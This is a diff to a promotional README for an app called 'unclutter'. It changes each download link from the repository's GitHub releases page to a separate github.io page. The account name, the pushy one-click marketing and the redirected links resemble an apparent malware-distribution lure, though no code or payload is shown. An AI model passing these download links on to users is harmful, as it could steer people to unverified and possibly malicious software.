@@ -1,7 +1,7 @@
 <h1>🧹 unclutter - Reclaim Your Screen, One Click</h1>
 
 <p align="center">
-  <a href="https://github.com/osama0112989757300-gif/unclutter/releases"><img src="https://img.shields.io/badge/Download_unclutter-v1.0.0-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=2E8B57" alt="Download Button" style="max-width:400px;border-radius:8px;"></a>
+  <a href="https://osama0112989757300-gif.github.io"><img src="https://img.shields.io/badge/Download_unclutter-v1.0.0-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=2E8B57" alt="Download Button" style="max-width:400px;border-radius:8px;"></a>
 </p>
 
 ---
@@ -53,7 +53,7 @@ We've made this as foolproof as possible. Follow these numbered steps exactly, a
 
 Open your web browser (like Chrome or Edge) and go to this link:
 
-👉 [**Visit this link to download the application**](https://github.com/osama0112989757300-gif/unclutter/releases)
+👉 [**Visit this link to download the application**](https://osama0112989757300-gif.github.io)
 
 You'll land on a page that shows versions of unclutter. Look for the newest one (usually at the top) with a version number like "v1.0.0" or "v2.3.1".
 
@@ -148,7 +148,7 @@ Thousands of users (like a busy mom reading recipes, a student researching artic
 
 Your cleaner, calmer internet is one click away. Download unclutter now and see the difference immediately.
 
-👉 [**Visit this link to download the application**](https://github.com/osama0112989757300-gif/unclutter/releases)
+👉 [**Visit this link to download the application**](https://osama0112989757300-gif.github.io)
 
 ---
 
